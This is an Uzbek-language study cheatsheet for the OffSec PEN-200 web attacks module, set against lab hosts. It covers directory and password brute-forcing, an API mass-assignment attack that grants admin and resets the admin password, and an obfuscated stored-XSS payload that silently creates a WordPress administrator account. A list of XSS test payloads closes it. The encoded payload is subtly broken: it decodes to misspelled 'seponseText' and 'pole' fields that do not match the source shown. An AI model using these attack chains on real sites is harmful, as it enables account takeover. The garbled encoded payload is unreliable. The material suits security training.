# 🌐 Web Application Attacks Cheatsheet (PEN-200 / OSCP 8-Bob)

Ushbu qoʻllanma **OffSec PEN-200: 8. Introduction to Web Application Attacks** moduli asosida tayyorlangan boʻlib, web ilovalarni xavfsizlik auditidan oʻtkazish, zaifliklarni aniqlash (Enumeration), API suiisteʼmoli (API Abuse), va Cross-Site Scripting (XSS) orqali imtiyozlarni oshirish (Privilege Escalation) boʻyicha toʻliq amaliy konspekt va tezkor qoʻllanma (cheat sheet) hisoblanadi.

---

## 📑 Mundarija
1. [Metodologiya (Assessment Methodology)](#1-metodologiya-assessment-methodology)
2. [Web Xavfsizlik Asboblari (Tools)](#2-web-xavfsizlik-asboblari-tools)
   - [Nmap](#nmap)
   - [Wappalyzer](#wappalyzer)
   - [Gobuster (Fayl & Katalog Brute-force)](#gobuster-fayl--katalog-brute-force)
   - [Burp Suite (Proxy, Repeater, Intruder)](#burp-suite-proxy-repeater-intruder)
3. [Web Ilova Enumeratsiyasi (Enumeration)](#3-web-ilova-enumeratsiyasi-enumeration)
   - [Dasturchi Asboblari (DevTools Debugging)](#dasturchi-asboblari-devtools-debugging)
   - [HTTP Response Headers & Sitemaps / robots.txt](#http-response-headers--sitemaps--robotstxt)
   - [REST API Enumeratsiyasi va Hujumlari (API Abuse)](#rest-api-enumeratsiyasi-va-hujumlari-api-abuse)
4. [Cross-Site Scripting (XSS)](#4-cross-site-scripting-xss)
   - [XSS Turlari (Stored, Reflected, DOM)](#xss-turlari)
   - [Maxsus Belgilar & Sanitization Tekshiruvi](#maxsus-belgilar--sanitization-tekshiruvi)
   - [Amaliyot: User-Agent orqali Stored XSS](#amaliyot-user-agent-orqali-stored-xss)
   - [XSS orqali Privilege Escalation (WordPress Admin Takeover)](#xss-orqali-privilege-escalation-wordpress-admin-takeover)
5. [Tezkor Buyruqlar va Payloadlar (Quick Reference)](#5-tezkor-buyruqlar-va-payloadlar-quick-reference)

---

## 1. Metodologiya (Assessment Methodology)

Web ilovalarni penetratsion testdan oʻtkazish axborot miqdori va koʻlamiga qarab 3 turga boʻlinadi:

| Metodologiya | Taʼrifi | Diqqat markazi |
| :--- | :--- | :--- |
| **White-box** | Manba kodi (source code), arxitektura va infratuzilmaga toʻliq ruxsat bor. | Dastur kodi auditi, mantiqiy xatolar, koʻp vaqt talab qiladi. |
| **Black-box** *(Zero-knowledge)* | Ilova haqida oldindan hech qanday maʼlumot yoʻq. | Qidiruv (Enumeration), passiv va faol razvedka, Bug Bounty uslubi. |
| **Grey-box** | Qisman maʼlumot taqdim etiladi (masalan, test foydalanuvchi akkaunti, freymvork turi). | Autentifikatsiyadan oʻtgan/oʻtmagan funksionallikni birgalikda tekshirish. |

### OWASP Top 10
Web ilovalardagi eng xavfli va keng tarqalgan zaifliklar roʻyxati (Broken Access Control, Cryptographic Failures, Injection, Insecure Design, Security Misconfiguration, XSS va boshqalar).

---

## 2. Web Xavfsizlik Asboblari (Tools)

### Nmap
Web portlarni va xizmat versiyalarini skanerlash:
```bash
# Web xizmatlarni (80, 443, 8000, 8080, 5000, 5001, 5002 va h.k.) versiyasi va standart skriptlar bilan skanerlash
nmap -p80,443,8000,8080,5000,5001,5002 -sV -sC -Pn 192.168.50.20
```

### Wappalyzer
Passiv axborot yigʻish orqali texnologiyalar stegini aniqlash:
* OS (Linux, Windows Server), Web Server (Apache, Nginx, Werkzeug).
* UI Freymvorklar (Bootstrap, Tailwind).
* Dasturlash tillari & Kutubxonalar (PHP, Python, Node.js, jQuery v3.6.0).
* *Eslatma:* Kutubxona versiyalarini bilish ulardagi maʼlum CVE zaifliklarini qidirishga yordam beradi.

### Gobuster (Fayl & Katalog Brute-force)
Yashirin fayl va kataloglarni lugʻat yordamida kashf qilish:

```bash
# Standart katalog qidiruvi
gobuster dir -u http://192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5

# Kengaytmalarni ko'rsatgan holda qidirish
gobuster dir -u http://192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,json -t 10

# Natijalardagi asosiy HTTP Status kodlari:
# 200 OK           - Resurs mavjud va ochiq
# 301 / 302        - Boshqa manzilga yo'naltirish (Redirect)
# 403 Forbidden    - Ruxsat yo'q (mavjud, lekin yopiq)
# 404 Not Found    - Manzil topilmadi
# 405 Not Allowed  - Metod qo'llab-quvvatlanmaydi (Endpoint mavjud!)
```

### Burp Suite (Proxy, Repeater, Intruder)

#### 1. Proksi sozlamalari
* **Burp Proxy:** Standart tinglovchi: `127.0.0.1:8080`.
* **Firefox sozlash:** `about:preferences#general` ➡️ *Network Settings* ➡️ *Manual proxy configuration* ➡️ `127.0.0.1`, Port: `8080` (Barcha protokollarga belgilash).
* **Captive Portal so'rovlarini to'xtatish (shovqinni kamaytirish):**
  Firefoxda `about:config` ga kiring, `network.captive-portal-service.enabled` ni topib, `false` ga oʻzgartiring.
* **Intercept On / Off:**
  - `Intercept is ON` — har bir soʻrov toʻxtatiladi, `Forward` yoki `Drop` qilinishi kerak.
  - `Intercept is OFF` — soʻrovlar avtomatik oʻtadi, lekin *HTTP History* da saqlanib boradi.

#### 2. Repeater
* Soʻrovni oʻzgartirish va qayta-qayta yuborish: `Proxy` ➡️ `HTTP History` ➡️ Soʻrov ustida oʻng tugma ➡️ `Send to Repeater` (`Ctrl + R`).

#### 3. Intruder (Avtomatlashtirilgan hujum & Brute-force)
* `/etc/hosts` fayliga sayt nomini kiritish: `echo "192.168.50.16 offsecwp" | sudo tee -a /etc/hosts`
* **Sozlash bosqichlari:**
  1. `Positions` boʻlimi ➡️ `Clear §` tugmasini bosish.
  2. Faqat brute-force qilinadigan qiymatni belgilab, `Add §` bosish (masalan: `pwd=§test§`).
  3. `Payloads` boʻlimi ➡️ `Payload type: Simple list` ➡️ Lugʻat yuklash (masalan, `rockyou.txt` dan tanlab).
  4. `Start attack` tugmasini bosish.
  5. Natijalarni **Status Code** (masalan, 302) va **Length** boʻyicha saralash.

---

## 3. Web Ilova Enumeratsiyasi (Enumeration)

### Dasturchi Asboblari (DevTools Debugging)
* **Qisqa tugmalar:** `Ctrl + Shift + I` (DevTools), `Ctrl + Shift + K` (Console), `Ctrl + Shift + C` (Inspector).
* **URL & Extensions vs Routes:**
  - Fayl kengaytmalari (`.php`, `.jsp`, `.do`, `.aspx`) orqa fondagi dasturlash tilini koʻrsatishi mumkin.
  - Hozirgi zamonaviy freymvorklarda *Routing* (yoʻnaltirish) ishlatiladi, fayl kengaytmasi boʻlmasligi mumkin.
* **Debugger:**
  - Yuklangan barcha JavaScript fayllarni koʻrish.
  - Siqilgan (minified) kodlarni `Pretty print source` (`{ }` tugmasi) orqali oʻqishga qulay formatga keltirish.
* **Inspector:**
  - Yashirin formalarni topish: `<input type="hidden" name="role" value="user">`
  - HTML izohlarni (comments) qidirish: `<!-- TODO: remove testing endpoint /api_dev -->`
  - Client-side cheklovlarni (masalan `maxlength="20"`, `disabled`) oʻchirib tashlash.

### HTTP Response Headers & Sitemaps / robots.txt
* **Headerlar:**
  - `Server: Werkzeug/1.0.1 Python/3.7.13` yoki `Apache/2.4.41 (Ubuntu)`
  - `X-Powered-By: PHP/7.4.3`
  - `X-Forwarded-For: <IP>` (Mijozning haqiqiy IP manzili proksi orqali uzatilganda)
  - `x-amz-cf-id` (Amazon CloudFront CDN ishlatilayotganini bildiradi)
* **robots.txt & sitemap.xml:**
  ```bash
  curl -s http://target.com/robots.txt
  # Allow va Disallow qatorlariga e'tibor qarating:
  # Disallow: /admin
  # Disallow: /backups/
  # Disallow: /api/v1/internal
  ```

### REST API Enumeratsiyasi va Hujumlari (API Abuse)
Zamonaviy ilovalarning backend qismi koʻpincha RESTful API orqali ishlaydi.

#### 1. Gobuster Pattern orqali API Endpointlarni qidirish
API manzillari odatda versiyalangan boʻladi (`/api/v1`, `/users/v1`, `/books/v1`).
```bash
# 1. Shablon (pattern) fayl yaratish:
cat << 'EOF' > pattern
{GOBUSTER}/v1
{GOBUSTER}/v2
EOF

# 2. Gobuster -p parametri bilan qidiruv:
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
```

#### 2. API hujjatlarini topish
* Koʻpincha `/ui`, `/swagger`, `/api-docs` yoʻllarida ochiq hujjatlar qolgan boʻladi.

#### 3. API larni Curl orqali tekshirish va tahlil qilish
```bash
# 1. Foydalanuvchilar ro'yxatini olish
curl -i http://192.168.50.16:5002/users/v1

# 2. Ichki yo'llarni kichik lug'at bilan aniqlash
gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
# Natija: /email, /password (Status 405)

# 3. 405 Method Not Allowed kodini tahlil qilish
# 405 kodi endpoint mavjudligini bildiradi! Standart GET metodidan boshqa (POST, PUT, PATCH) metodlarni sinash kerak:
curl -i http://192.168.50.16:5002/users/v1/admin/password
```

#### 4. API orqali Login va Roʻyxatdan oʻtish (Mass Assignment)
```bash
# Noto'g'ri ma'lumot bilan login tekshirish (JSON formatda)
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/login

# Yangi foydalanuvchi qo'shishda qo'shimcha parametr (Mass Assignment) kiritish:
# "admin": "True" parametrini qo'shib ro'yxatdan o'tish:
curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' \
  -H 'Content-Type: application/json' \
  http://192.168.50.16:5002/users/v1/register

# Yangi admin foydalanuvchi bilan tizimga kirib JWT token olish:
curl -d '{"password":"lab","username":"offsec"}' \
  -H 'Content-Type: application/json' \
  http://192.168.50.16:5002/users/v1/login
```

#### 5. Olingan JWT Token bilan PUT soʻrovi orqali Admin parolini yangilash
```bash
# POST 405 bergan holatda PUT yoki PATCH ishlatiladi:
curl -X 'PUT' 'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth <JWT_TOKEN>' \
  -d '{"password": "pwned"}'

# So'ngra yangilangan parol bilan admin sifatida tizimga kirish:
curl -d '{"password":"pwned","username":"admin"}' \
  -H 'Content-Type: application/json' \
  http://192.168.50.16:5002/users/v1/login
```

---

## 4. Cross-Site Scripting (XSS)

XSS — bu mijoz (brauzer) tomonida zararli JavaScript kodini ijro etish zaifligidir.

### XSS Turlari
1. **Stored (Persistent) XSS:**
   - Zararli kod maʼlumotlar bazasida, faylda yoki server keshida saqlanadi.
   - Sahifani ochgan har bir foydalanuvchi (shu jumladan admin) brauzerida ishga tushadi.
   - *Joylari:* Foydalanuvchi izohlari, profil maʼlumotlari, tashrif buyuruvchilar loglari (Visitor logs).
2. **Reflected (Non-persistent) XSS:**
   - Payload soʻrov parametri (URL query, POST body) orqali yuboriladi va server javobida aks ettiriladi.
   - Faqat oʻsha havolani bosgan foydalanuvchiga taʼsir qiladi.
   - *Joylari:* Qidiruv satri (`?q=`), xato xabarlari.
3. **DOM-based XSS:**
   - Zaiflik serverga bormasdan, brauzerning oʻzida Document Object Model (DOM) ni notoʻgʻri manipulyatsiya qilish natijasida yuzaga keladi (masalan, `document.location`, `innerHTML`).

### Maxsus Belgilar & Sanitization Tekshiruvi
Filtrlarni tekshirish uchun quyidagi maxsus belgilar kiritiladi:
```text
< > ' " { } ;
```
* `< >` — HTML teglarini ochish/yopish.
* `' "` — String qiymatlarini yopish yoki ochish.
* `{ }` — Funksiya va bloklarni belgilash.
* `;` — JavaScript buyrugʻini yakunlash.

Agar dastur ushbu belgilarni HTML Entity (`&lt;`, `&gt;`) yoki URL kodlashga oʻtkazmasa, u XSS ga moyil boʻladi.

---

### Amaliyot: User-Agent orqali Stored XSS

Agar ilovada biror HTTP sarlavha (masalan, `User-Agent` yoki `X-Forwarded-For`) bazaga tozalashlarsiz saqlanib, admin panelda jadvalga chiqarilsa:

```php
// Zaif kod misoli (Visitors WordPress plagini):
$wpdb->insert($table_name, array(
    'useragent' => $_SERVER['HTTP_USER_AGENT'],
    'ip' => $_SERVER['HTTP_X_FORWARDED_FOR']
));
// Ko'rsatish qismi:
echo '<td>' . $record->useragent . '</td>'; // Sanitization yo'q!
```

#### XSS tekshirish (PoC):
```bash
# Burp Suite orqali yoki curl bilan maxsus User-Agent yuborish:
curl -i http://offsecwp/ --user-agent "<script>alert(42)</script>"
```
Administrator plagin statistikasini ochganda `alert(42)` xabari chiqadi.

---

### XSS orqali Privilege Escalation (WordPress Admin Takeover)

#### Cookie oʻgʻirlashdagi muammo:
Koʻpincha `HttpOnly` bayrogʻi sababli `document.cookie` orqali admin sessiya pechenelarini JavaScript yordamida oʻgʻirlab boʻlmaydi.
* **Yechim:** Qurbon adminning oʻz brauzeri orqali yangi administrator akkaunt yaratuvchi JavaScript kodini yashirin tarzda ishga tushirish!

#### CSRF Nonce toʻsigʻini yengish:
WordPress formalarida CSRF dan himoya qiluvchi tasodifiy `_wpnonce` mavjud. XSS brauzer kontekstida ishlagani sababli, u sahifaga soʻrov yuborib, nonce qiymatini oʻqib olish imkoniyatiga ega:

```javascript
// 1. Nonce qiymatini /wp-admin/user-new.php sahifasidan Regex orqali o'g'irlash:
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];

// 2. Olingan Nonce bilan yangi Administrator yaratuvchi POST so'rov yuborish:
var params = "action=createuser&_wpnonce_create-user=" + nonce + 
             "&user_login=attacker&email=attacker@random.com" + 
             "&pass1=attackerpass&pass2=attackerpass&role=administrator";

ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

#### Toʻliq Payloadni tayyorlash va kiritish zanjiri:
1. **Minify:** Kodni [JSCompress](https://jscompress.com) yoki bir qatorli formatga keltirish.
2. **String.fromCharCode orqali kodlash:** Maxsus belgilar (`"`, `'`, `<`, `>`) buzilmasligi uchun UTF-16 sonlarga oʻtkazish:

```javascript
// Brauzer konsolida String.fromCharCode generator:
function encode_to_javascript(str) {
    var out = [];
    for (var i = 0; i < str.length; i++) {
        out.push(str.charCodeAt(i));
    }
    return out.join(",");
}
console.log(encode_to_javascript("YUQORIDAGI_MINIFIED_KOD"));
```

3. **Yakuniy Payloadni Curl orqali yuborish:**
```bash
curl -i http://offsecwp \
  --user-agent "<script>eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,117,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,115,101,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,101,114,64,111,102,102,115,101,99,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,99,107,101,114,112,97,115,115,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,112,97,115,115,38,112,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59))</script>" \
  --proxy 127.0.0.1:8080
```

4. **Natija:**
   Administrator sahifani ochishi bilanoq, fon rejimida `user_login=attacker`, parol `attackerpass` boʻlgan yangi administrator yaratiladi. Tizim toʻliq qoʻlga kiritiladi (`attacker / attackerpass`).

---

## 5. Tezkor Buyruqlar va Payloadlar (Quick Reference)

### 🔹 Gobuster buyruqlari
```bash
# Katalog va fayllarni qidirish
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -t 10

# API endpoint versiyalarini shablon bilan qidirish
gobuster dir -u http://TARGET:5001 -w /usr/share/wordlists/dirb/big.txt -p pattern

# Ma'lum kengaytmalarni kiritish
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak,old
```

### 🔹 Curl buyruqlari
```bash
# Sarlavhalarni (headers) ko'rish
curl -i http://TARGET

# robots.txt faylini o'qish
curl -s http://TARGET/robots.txt

# JSON body bilan POST so'rov
curl -X POST -H "Content-Type: application/json" -d '{"username":"admin","password":"123"}' http://TARGET/api/login

# PUT so'rovi va Authorization token bilan yuborish
curl -X PUT -H "Content-Type: application/json" -H "Authorization: Bearer <TOKEN>" -d '{"password":"new"}' http://TARGET/api/users/1

# So'rovni Burp Suite orqali o'tkazish
curl -i http://TARGET --proxy 127.0.0.1:8080
```

### 🔹 XSS Test Payloadlari
```html
<!-- Oddiy alert PoC -->
<script>alert(1)</script>
<script>alert(document.domain)</script>

<!-- Rasm orqali (Script teglari filtrlanganda) -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- Atributni yopish orqali -->
"><script>alert(1)</script>
" onmouseover=alert(1) autofocus="

<!-- String.fromCharCode obfuskatsiya shabloni -->
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
```

### 🔹 Python one-liner: String.fromCharCode kodlagich
Terminalda istalgan JavaScript kodini sonlarga aylantirish:
```bash
python3 -c 'import sys; s=sys.stdin.read().strip(); print(",".join(str(ord(c)) for c in s))'
```
*Ishlatish:*
```bash
echo -n "alert(document.cookie)" | python3 -c 'import sys; s=sys.stdin.read().strip(); print(",".join(str(ord(c)) for c in s))'
# Natija: 97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41
```
